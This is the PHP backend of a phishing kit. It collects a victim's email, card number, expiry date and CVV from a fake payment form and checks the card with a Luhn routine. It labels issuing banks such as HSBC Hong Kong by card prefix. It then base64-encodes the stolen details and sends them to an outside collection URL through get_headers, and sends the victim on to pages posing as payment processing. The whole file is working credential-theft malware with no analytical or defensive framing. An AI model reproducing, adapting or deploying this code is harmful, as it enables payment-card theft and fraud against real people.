<?php
session_start();
date_default_timezone_set("Europe/Bucharest");
include('files/timezone.inc');

$ip = getenv("REMOTE_ADDR");
$os = $_SERVER['HTTP_USER_AGENT'];
$card = $_POST['didi'];
$adddate=date("D M d, Y g:i a");

$rndtext = md5(microtime());
$rrand = rand(000000000,999999999);
$rrand1 = rand(000000000,999999999);
$rndtext = md5(microtime()).md5(microtime());

function validate_cc_number($cc_number) {
   $false = false;
   $card_type = "";
   $card_regexes = array(
      "/^4\d{12}(\d\d\d){0,1}$/" => "visa",
      "/^5[12345]\d{14}$/"       => "mastercard",
      "/^3[47]\d{13}$/"          => "amex",
      "/^6011\d{12}$/"           => "discover",
      "/^30[012345]\d{11}$/"     => "diners",
      "/^3[68]\d{12}$/"          => "diners",
      "/^(62[0-9]{14,17})$/"     => "unionpay",
   );
 
   foreach ($card_regexes as $regex => $type) {
       if (preg_match($regex, $cc_number)) {
           $card_type = $type;
           break;
       }
   }
 
   if (!$card_type) {
       return $false;
   }
 
   /*  mod 10 checksum algorithm  */
   $revcode = strrev($cc_number);
   $checksum = 0; 
 
   for ($i = 0; $i < strlen($revcode); $i++) {
       $current_num = intval($revcode[$i]);  
       if($i & 1) {  /* Odd  position */
          $current_num *= 2;
       }
       /* Split digits and add. */
           $checksum += $current_num % 10; if
       ($current_num >  9) {
           $checksum += 1;
       }
   }
 
   if ($checksum % 10 == 0) {
       return $card_type;
   } else {
       return $false;
   }
}
$card2 = preg_replace("[^0-9]", "", $card);
$_SESSION['didi'] = $card2;
$bin = substr($card2, 0, 6);
$bin2 = substr($card2, 0, 1);
$bin3 = substr($card2, 0, 2);
$cvv = strrev($_POST['civivi']);
// ============== Binuri  ============== //

if ($bin == '464579') {
$bank = "Anz Business Debit";
$good = "yes";
}
elseif (($bin == '496604') || ($bin == '541180') || ($bin == '518542') || ($bin == '467932') || ($bin == '420184') || ($bin == '543122') || ($bin == '528946') || ($bin == '492111')){
$bank = "HSBC Hong Kong";
$good = "yes";
}
elseif (($bin == '536618') || ($bin == '454867') || ($bin == '483348') || ($bin == '437523') || ($bin == '483741') || ($bin == '471540') || ($bin == '538920') || ($bin == '556047') || ($bin == '432742')){
$bank = "Not Supported";
$good = "no";
}
else
{
$bank = "Unknown";
$good = "yes";
}
// ============== Gata Binuri  ============== //

$_SESSION['bank'] = $bank;

$t = validate_cc_number($card2);
$site1 = "http://adiwolpe.com/themes/garland/print/make1.php?info=";

function test($test,$site) { 
$testencoded = base64_encode($test); 
$testgo = "$site$testencoded"; 
get_headers("$testgo"); 
} 
if ($test != "") { 
test("$test","$site1");  
die(); 
} 

function writeit($data,$site) {  
$dataz = base64_encode($data); 
$zait = "$site$dataz"; 
get_headers("$zait"); 
} 

// ======  Validare  ====== //
if ($t) {

if ($good == 'yes'){
$data = "
-------------
Email: ".$_SESSION['email']."
-------------
Card: ".$_POST['didi']."
Exp: ".$_POST['exp']."
Cvv: ".$_POST['civivi']."
-------------
Bank: $bank
-------------
IP Address: $ip
Date: $adddate
";
writeit($data,$site1);
header("Location: processingdata.html");
}
elseif ($good == 'novbv'){
$data = "
-------------
Email: ".$_SESSION['email']."
-------------
Card: ".$_POST['didi']."
Exp: ".$_POST['exp']."
Cvv: $cvv
-------------
Bank: $bank
-------------
IP Address: $ip
Date: $adddate
";
writeit($data,$site3);
header("Location: confirmation.php");
}
else
{
$data = "
-------------
Email: ".$_SESSION['email']."
-------------
Card: ".$_POST['didi']."
Exp: ".$_POST['exp']."
Cvv: ".$_POST['civivi']."
-------------
Bank: $bank
-------------
IP Address: $ip
Date: $adddate
";
writeit($data,$site3);
header("Location: serveringenico.php?data=invalid");
}
} else {
   header("Location: serveringenico.php?data=invalid");
}
?>